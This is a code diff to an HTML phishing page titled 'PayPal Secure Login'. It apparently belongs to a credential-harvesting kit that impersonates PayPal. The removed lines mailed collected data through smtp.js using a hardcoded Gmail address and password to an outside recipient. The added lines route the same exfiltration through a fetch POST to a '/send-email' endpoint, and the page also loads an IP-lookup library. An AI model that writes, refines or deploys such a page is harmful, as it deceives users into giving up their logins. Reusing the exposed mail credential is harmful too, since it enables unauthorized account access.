@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PayPal Secure Login</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ipinfo.js/3.3.0/ipinfo.min.js"></script>
   <style>
     * {
@@ -680,19 +680,29 @@
       sendEmail(subject, body);
     }
 
-    // Send email using SMTP
-    function sendEmail(subject, body) {
-      Email.send({
-        Host: "smtp.gmail.com",
-        Username: "tuttyger@gmail.com",
-        Password: "cqfpoixkqqihvgvx",
-        To: 'support@cbelko.net',
-        From: "tuttyger@gmail.com",
-        Subject: subject,
-        Body: body
-      }).then(
-        message => console.log("Email sent:", message)
-      );
+    // Send email using fetch API
+    async function sendEmail(subject, body) {
+      try {
+        const response = await fetch('/send-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            subject: subject,
+            body: body
+          })
+        });
+        
+        const result = await response.json();
+        if (result.success) {
+          console.log("Email sent successfully");
+        } else {
+          console.error("Failed to send email:", result.message);
+        }
+      } catch (error) {
+        console.error("Error sending email:", error);
+      }
     }
 
     // Navigation functions
